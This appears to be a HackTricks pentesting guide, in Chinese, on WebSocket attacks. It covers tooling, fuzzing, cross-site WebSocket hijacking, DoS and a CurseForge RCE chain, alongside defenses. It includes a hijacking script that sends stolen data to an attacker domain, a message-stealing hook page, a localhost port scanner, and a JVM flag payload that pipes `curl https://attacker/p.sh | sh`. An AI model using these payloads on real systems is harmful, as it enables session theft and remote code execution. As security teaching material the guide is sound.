# WebSocket 攻击

{{#include ../banners/hacktricks-training.md}}

## 什么是 WebSockets

WebSocket 连接通过初始 **HTTP** 握手建立，并被设计为 **长连接**，允许在任何时间进行双向消息传递而无需事务性系统。这使得 WebSockets 在需要 **低延迟或服务器发起通信** 的应用中（例如实时金融数据流）尤其有优势。

### WebSocket 连接的建立

关于建立 WebSocket 连接的详细说明可在 [**here**](https://infosecwriteups.com/cross-site-websocket-hijacking-cswsh-ce2a6b0747fc) 获取。总之，WebSocket 连接通常由客户端 JavaScript 发起，如下所示：
```javascript
var ws = new WebSocket("wss://normal-website.com/ws")
```
协议 `wss` 表示通过 **TLS** 保护的 WebSocket 连接，而 `ws` 则表示 **未加密** 的连接。

在连接建立期间，浏览器和服务器通过 HTTP 执行握手。握手过程涉及浏览器发送请求并由服务器响应，如以下示例所示：

浏览器发送握手请求：
```javascript
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```
服务器的握手响应：
```javascript
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```
连接建立后将保持打开，以便双向交换消息。

**WebSocket 握手的关键点：**

- `Connection` 和 `Upgrade` 头表示 WebSocket 握手的开始。
- `Sec-WebSocket-Version` 头表明所需的 WebSocket 协议版本，通常为 `13`。
- 在 `Sec-WebSocket-Key` 头中发送一个 Base64 编码的随机值，确保每次握手都是唯一的，这有助于防止缓存代理的问题。该值不是用于认证，而是用于确认响应不是由错误配置的服务器或缓存生成的。
- 服务器响应中的 `Sec-WebSocket-Accept` 头是 `Sec-WebSocket-Key` 的哈希，用以验证服务器确实打算打开 WebSocket 连接。

这些特性确保握手过程安全可靠，为高效的实时通信铺平道路。

### Linux 控制台

可以使用 `websocat` 与 websocket 建立原始连接。
```bash
websocat --insecure wss://10.10.10.10:8000 -v
```
或者创建一个 websocat 服务器：
```bash
websocat -s 0.0.0.0:8000 #Listen in port 8000
```
### MitM websocket 连接

如果你发现客户端在当前本地网络上连接到 **HTTP websocket**，可以尝试 [ARP Spoofing Attack ](../generic-methodologies-and-resources/pentesting-network/index.html#arp-spoofing) 来在客户端与服务器之间执行 MitM attack。\
一旦客户端尝试连接到你，你就可以使用:
```bash
websocat -E --insecure --text ws-listen:0.0.0.0:8000 wss://10.10.10.10:8000 -v
```
### Websockets 枚举

你可以使用 **工具** [**https://github.com/PalindromeLabs/STEWS**](https://github.com/PalindromeLabs/STEWS) **来自动发现、指纹识别并搜索 websockets 中已知的** **vulnerabilities**。

### Websocket 调试工具

- **Burp Suite** 支持 MitM websockets 通信，方式与常规 HTTP 通信非常相似。
- [**socketsleuth**](https://github.com/snyk/socketsleuth) **Burp Suite extension** 将允许你在 Burp 中更好地管理 Websocket 通信：获取 **history**、设置 **interception rules**、使用 **match and replace** 规则、使用 **Intruder** 和 **AutoRepeater.**
- [**WSSiP**](https://github.com/nccgroup/wssip)**：** 全称 "**WebSocket/Socket.io Proxy**"，这个用 Node.js 编写的工具提供了一个用户界面，用于 **capture, intercept, send custom** 消息并查看客户端与服务器之间的所有 WebSocket 和 Socket.IO 通信。
- [**wsrepl**](https://github.com/doyensec/wsrepl) 是一个为 penetration testing 专门设计的 **interactive websocket REPL**。它提供了一个接口用于观察 **incoming websocket messages and sending new ones**，并提供一个易用的框架来 **automating** 该通信。
- [**https://websocketking.com/**](https://websocketking.com/) 是一个通过 **websockets** 与其他网站通信的 web 工具。
- [**https://hoppscotch.io/realtime/websocket**](https://hoppscotch.io/realtime/websocket) 除了其他类型的通信/协议外，它还提供一个通过 **websockets** 与其他网站通信的 web 界面。

## 解密 Websocket

- [https://github.com/Anof-cyber/PyCript](https://github.com/Anof-cyber/PyCript)
- [https://github.com/Anof-cyber/PyCript-WebSocket/](https://github.com/Anof-cyber/PyCript-WebSocket/)

## Websocket Lab

在 [**Burp-Suite-Extender-Montoya-Course**](https://github.com/federicodotta/Burp-Suite-Extender-Montoya-Course) 中有用于启动一个使用 websockets 的 web 应用的代码，在 [**this post**](https://security.humanativaspa.it/extending-burp-suite-for-fun-and-profit-the-montoya-way-part-3/) 中可以找到相关解释。

## Websocket 模糊测试

Burp 扩展 [**Backslash Powered Scanner**](https://github.com/PortSwigger/backslash-powered-scanner) 现在也允许对 WebSocket 消息进行 fuzz。你可以在 [**here**](https://arete06.com/posts/fuzzing-ws/#adding-websocket-support-to-backslash-powered-scanner) 阅读更多信息。

### WebSocket Turbo Intruder (Burp extension)

PortSwigger 的 WebSocket Turbo Intruder 为 WebSockets 带来 Turbo Intruder 风格的 Python 脚本和高速 fuzzing。可从 BApp Store 或源码安装。它包含两个组件：

- Turbo Intruder：使用自定义引擎对单个 WS 端点进行高容量消息发送。
- HTTP Middleware：暴露一个本地 HTTP 端点，将请求体通过持久连接转发为 WS 消息，因此任何基于 HTTP 的扫描器都可以探测 WS 后端。

用于对 WS 端点进行 fuzz 并过滤相关响应的基本脚本模式：
```python
def queue_websockets(upgrade_request, message):
connection = websocket_connection.create(upgrade_request)
for i in range(10):
connection.queue(message, str(i))

def handle_outgoing_message(websocket_message):
results_table.add(websocket_message)

@MatchRegex(r'{\"user\":\"Hal Pline\"')
def handle_incoming_message(websocket_message):
results_table.add(websocket_message)
```
使用像 `@MatchRegex(...)` 这样的装饰器来减少噪声，当单条消息触发多个响应时。

### 在 HTTP 之下桥接 WS（HTTP 中间件）

封装一个持久的 WS 连接，并将 HTTP 请求体转发为 WS 消息，以便使用 HTTP 扫描器进行自动化测试：
```python
def create_connection(upgrade_request):
connection = websocket_connection.create(upgrade_request)
return connection

@MatchRegex(r'{\"user\":\"You\"')
def handle_incoming_message(websocket_message):
results_table.add(websocket_message)
```
然后在本地发送 HTTP；请求体被转发为 WS 消息：
```http
POST /proxy?url=https%3A%2F%2Ftarget/ws HTTP/1.1
Host: 127.0.0.1:9000
Content-Length: 16

{"message":"hi"}
```
这让你能够驱动 WS 后端，同时过滤“有趣”的事件（例如，SQLi 错误、auth bypass、command injection 行为）。

### Socket.IO 处理（握手、心跳、事件）

Socket.IO 在 WS 之上增加了自己的帧结构。通过必选查询参数 `EIO`（例如，`EIO=4`）来检测它。使用 Ping (`2`) 和 Pong (`3`) 保持会话活跃，并用 `"40"` 开始对话，然后发出类似 `42["message","hello"]` 的事件。

Intruder 示例：
```python
import burp.api.montoya.http.message.params.HttpParameter as HttpParameter

def queue_websockets(upgrade_request, message):
connection = websocket_connection.create(
upgrade_request.withUpdatedParameters(HttpParameter.urlParameter("EIO", "4")))
connection.queue('40')
connection.queue('42["message","hello"]')

@Pong("3")
def handle_outgoing_message(websocket_message):
results_table.add(websocket_message)

@PingPong("2", "3")
def handle_incoming_message(websocket_message):
results_table.add(websocket_message)
```
HTTP 适配器变体:
```python
import burp.api.montoya.http.message.params.HttpParameter as HttpParameter

def create_connection(upgrade_request):
connection = websocket_connection.create(
upgrade_request.withUpdatedParameters(HttpParameter.urlParameter("EIO", "4")))
connection.queue('40')
connection.decIn()
return connection

@Pong("3")
def handle_outgoing_message(websocket_message):
results_table.add(websocket_message)

@PingPong("2", "3")
def handle_incoming_message(websocket_message):
results_table.add(websocket_message)
```
### 通过 Socket.IO 检测 server‑side prototype pollution

按照 PortSwigger 的安全检测技术，尝试通过发送如下 payload 来污染 Express 内部：
```json
{"__proto__":{"initialPacket":"Polluted"}}
```
如果问候或行为改变（例如，echo 包含 "Polluted"），你很可能污染了服务端的 prototypes（prototype pollution）。影响取决于可达的 sinks；将其与 Node.js prototype pollution 部分中的 gadgets 关联。参见：

- Check [NodeJS – __proto__ & prototype Pollution](deserialization/nodejs-proto-prototype-pollution/README.md) for sinks/gadgets and chaining ideas.

### WebSocket race conditions with Turbo Intruder

默认引擎会在单个连接上批量发送消息（吞吐高，但不利于触发竞态）。使用 THREADED 引擎可以生成多个 WS 连接并并行发送 payloads，以触发逻辑竞态（double‑spend、token reuse、state desync）。从示例脚本开始，并在 `config()` 中调优并发。

- 在 [Race Condition](race-condition.md) 中了解方法论和替代方案（参见 “RC in WebSockets”）。

### WebSocket DoS: malformed frame “Ping of Death”

构造 WS 帧，其头部声明一个巨大的 payload length 但不发送主体。一些 WS 服务器会信任该长度并预分配缓冲区；将其设置接近 `Integer.MAX_VALUE` 可能导致 Out‑Of‑Memory 并触发远程未认证 DoS。参见示例脚本。

### CLI and debugging

- Headless fuzzing: `java -jar WebSocketFuzzer-<version>.jar <scriptFile> <requestFile> <endpoint> <baseInput>`
- 启用 WS Logger 以使用内部 ID 捕获并关联消息。
- 在复杂 adapters 上对 `Connection` 使用 `inc*`/`dec*` 辅助函数以微调消息 ID 处理。
- 类似 `@PingPong`/`@Pong` 的装饰器和 `isInteresting()` 等辅助函数可减少噪音并保持会话存活。

### Operational safety

高速率 WS fuzzing 可能会打开大量连接并每秒发送数千条消息。畸形帧和高发送率可能导致真实的 DoS。仅在被授权的情形下使用。

## Cross-site WebSocket hijacking (CSWSH)

Cross-site WebSocket hijacking（也称为 cross-origin WebSocket hijacking）被视为影响 WebSocket 握手的特定类型的 [Cross-Site Request Forgery (CSRF)](csrf-cross-site-request-forgery.md)。当 WebSocket 握手仅通过 HTTP cookies 进行认证，而没有 CSRF tokens 或类似的安全措施时，就会出现此漏洞。

攻击者可以通过托管一个恶意网页来利用这一点，该页面会向易受攻击的应用发起 cross-site WebSocket 连接。结果，这个连接会被视为受害者与该应用的会话的一部分，从而利用会话处理机制中缺乏 CSRF 保护的弱点。

要使该攻击生效，需要满足下列条件：

- The websocket **authentication must be cookie based**
- The cookie must be accessible from the attackers server (this usually means **`SameSite=None`**) and no **Firefox Total Cookie Protection** enabled in Firefox and no **blocked third-party cookies** in Chrome.
- The websocket server must not check the origin of the connection (or this must be bypasseable)

另外：

- 如果认证基于本地连接（到 localhost 或本地网络），该攻击 **将可行**，因为目前没有任何保护禁止它（查看 [more info here](https://blog.includesecurity.com/2025/04/cross-site-websocket-hijacking-exploitation-in-2025/)）

### Simple Attack

请注意，当建立 websocket 连接时，cookie 会被发送到服务器。服务器可能会使用它来将每个特定用户与其基于所发送 cookie 的 websocket 会话关联起来。

因此，例如，如果 websocket 服务器在收到一条内容为 "READY" 的消息时会返回该用户的对话历史，那么一个简单的 XSS（建立连接时 cookie 会自动发送以授权受害用户）发送 "READY" 即可检索该对话历史。
```html
<script>
websocket = new WebSocket('wss://your-websocket-URL')
websocket.onopen = start
websocket.onmessage = handleReply
function start(event) {
websocket.send("READY"); //Send the message to retreive confidential information
}
function handleReply(event) {
//Exfiltrate the confidential information to attackers server
fetch('https://your-collaborator-domain/?'+event.data, {mode: 'no-cors'})
}
</script>
```
### Cross Origin + Cookie with a different subdomain

在这篇博客文章 [https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/](https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/) 中，攻击者设法在发生 websocket 通信的域的一个 **subdomain 中执行任意 Javascript**。由于它是一个 **subdomain**，**cookie** 会被**发送**，并且因为 **Websocket** 没有正确检查 **Origin**，可以与其通信并**窃取 tokens**。

### Stealing data from user

复制你想要冒充的 web 应用（例如 .html 文件），并在发生 websocket 通信的脚本中添加此代码：
```javascript
//This is the script tag to load the websocket hooker
;<script src="wsHook.js"></script>

//These are the functions that are gonig to be executed before a message
//is sent by the client or received from the server
//These code must be between some <script> tags or inside a .js file
wsHook.before = function (data, url) {
var xhttp = new XMLHttpRequest()
xhttp.open("GET", "client_msg?m=" + data, true)
xhttp.send()
}
wsHook.after = function (messageEvent, url, wsObject) {
var xhttp = new XMLHttpRequest()
xhttp.open("GET", "server_msg?m=" + messageEvent.data, true)
xhttp.send()
return messageEvent
}
```
现在从 [https://github.com/skepticfx/wshook](https://github.com/skepticfx/wshook) 下载 `wsHook.js` 文件，并 **将其保存到包含 web 文件的文件夹中**。\
将 web 应用暴露并让用户连接后，你就能够通过 websocket 窃取发送和接收的消息：
```javascript
sudo python3 -m http.server 80
```
### CSWSH 保护措施

CSWSH 攻击基于这样一个事实：**用户会连接到恶意页面**，该页面会**打开一个 websocket 连接**到用户已登录的网页，并会以用户身份进行认证，因为请求会发送用户的 cookies。

如今，可以很容易地防止这个问题：

- **Websocket server checking the origin**：Websocket 服务器应始终检查连接来源，以防止意外页面连接到它。
- **Authentication token**：与其基于 cookie 进行认证，不如让 websocket 连接基于由服务器为用户生成且攻击者未知的 token（例如 anti-CSRF token）
- **SameSite Cookie attribute**：如果 Cookie 的 `SameSite` 值为 `Lax` 或 `Strict`，则来自外部攻击者页面的请求不会发送这些 Cookie 到受害服务器，因此基于 Cookie 的认证将无法成功。注意 Chrome 现在默认会将没有显式设置该标志的 Cookie 值设为 **`Lax`**，从而默认更安全。然而，Cookie 在创建后的前两分钟其值会是 **`None`**，在这段有限时间内仍然是易受攻击的（预计该限制未来可能会被移除）。
- **Firefox Total Cookie Protection**：Total Cookie Protection 的工作方式是将 Cookie 隔离到其创建的网站。基本上每个站点都有自己的 Cookie 存储分区，以防第三方将用户的浏览历史串联起来。这使得 **CSWSH 无法使用**，因为攻击者站点无法访问这些 Cookie。
- **Chrome third-party cookies block**：即使 `SameSite=None`，此设置也可能阻止将已认证用户的 Cookie 发送到 websocket 服务器。

### Localhost WebSocket 滥用与浏览器端口发现

桌面启动器通常会启动辅助进程（例如 CurseForge 的 `CurseAgent.exe`），在 `127.0.0.1:<random_port>` 上暴露 JSON-RPC WebSockets。浏览器**不会在回环 sockets 上强制执行 SOP**，因此任何网页都可以尝试进行握手。如果该 agent 接受任意的 `Origin` 值并跳过二次认证，则 IPC 接口将可直接从 JavaScript 远程控制。

#### 枚举暴露的方法

捕获一个合法会话以了解协议契约。例如，CurseForge 会发送诸如 `{"type":"method","name":"minecraftTaskLaunchInstance","args":[{...}]}` 的帧，其中 `name` 是 RPC 方法，`args` 包含结构化对象（GUID、分辨率、标志等）。一旦掌握了这种格式，你就可以直接从注入页面调用诸如 `createModpack`、`minecraftGetDefaultLocation` 或任何其他特权任务的方法。

#### 基于浏览器的端口发现

由于该辅助进程绑定到随机高端口，利用者首先通过 WebSockets 对 localhost 进行暴力探测。基于 Chromium 的浏览器在限流前能容忍约 ~16k 次升级失败，这足以扫描短暂端口范围；而 Firefox 在几百次失败后往往会崩溃或冻结，因此实际的 PoC 通常针对 Chromium。

<details>
<summary>最简浏览器扫描器</summary>
```javascript
async function findLocalWs(start = 20000, end = 36000) {
for (let port = start; port <= end; port++) {
await new Promise((resolve) => {
const ws = new WebSocket(`ws://127.0.0.1:${port}/`);
let settled = false;
const finish = () => { if (!settled) { settled = true; resolve(); } };
ws.onerror = ws.onclose = finish;
ws.onopen = () => {
console.log(`Found candidate on ${port}`);
ws.close();
finish();
};
});
}
}
```
</details>

Once a connection survives the handshake and returns protocol-specific data, reuse that socket for the RPC chain.

#### 将 JSON-RPC 方法串联以达成 RCE

The CurseForge exploit 将两个未认证的调用串联：

1. `createModpack` → 返回一个新的 `MinecraftInstanceGuid`，无需用户交互。
2. `minecraftTaskLaunchInstance` → 启动该 GUID，同时通过 `AdditionalJavaArguments` 接受任意 JVM 标志。

JNI/JVM 的诊断选项然后提供了一个现成的 RCE 原语。例如，限制 metaspace 以强制崩溃，并利用 error hook 来执行命令：
```
-XX:MaxMetaspaceSize=16m -XX:OnOutOfMemoryError="cmd.exe /c powershell -nop -w hidden -EncodedCommand ..."
```
在 Unix 目标上，只需将 payload 替换为 `/bin/sh -c 'curl https://attacker/p.sh | sh'`。即使无法触碰应用程序代码——只要能控制 JVM CLI 就足够。

这种“create resource → privileged launch”模式在更新器和启动器中经常出现。每当方法 (1) 产生一个由服务器追踪的标识符，而方法 (2) 使用该标识符执行代码或生成进程时，都应检查是否可以注入用户控制的参数。


## 竞态条件

WebSockets 中的竞态条件也会出现， [check this information to learn more](race-condition.md#rc-in-websockets)。

## 其他漏洞

由于 Web Sockets 是一种机制用于 **向服务器端和客户端发送数据**，取决于服务器和客户端如何处理这些信息，**Web Sockets 可以被用来利用其他多种漏洞，例如 XSS、SQLi，或通过 websocket 中的用户输入利用任何其他常见的 web 漏洞。**

## **WebSocket Smuggling**

该漏洞可能允许你通过使其相信已建立了一个 **websocket communication was stablished**（即使实际上并非如此）来**绕过反向代理的限制**。这可能允许攻击者**访问隐藏的端点**。更多信息请查看以下页面：


{{#ref}}
h2c-smuggling.md
{{#endref}}

## 参考资料

- [https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages](https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages)
- [https://blog.includesecurity.com/2025/04/cross-site-websocket-hijacking-exploitation-in-2025/](https://blog.includesecurity.com/2025/04/cross-site-websocket-hijacking-exploitation-in-2025/)
- [WebSocket Turbo Intruder: Unearthing the WebSocket Goldmine](https://portswigger.net/research/websocket-turbo-intruder-unearthing-the-websocket-goldmine)
- [WebSocket Turbo Intruder – BApp Store](https://portswigger.net/bappstore/ba292c5982ea426c95c9d7325d9a1066)
- [WebSocketTurboIntruder – GitHub](https://github.com/d0ge/WebSocketTurboIntruder)
- [Turbo Intruder background](https://portswigger.net/research/turbo-intruder-embracing-the-billion-request-attack)
- [Server-side prototype pollution – safe detection methods](https://portswigger.net/research/server-side-prototype-pollution#safe-detection-methods-for-manual-testers)
- [WS RaceCondition PoC (Java)](https://github.com/redrays-io/WS_RaceCondition_PoC)
- [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py)
- [PingOfDeathExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/PingOfDeathExample.py)
- [When WebSockets Lead to RCE in CurseForge](https://elliott.diy/blog/curseforge/)

{{#include ../banners/hacktricks-training.md}}
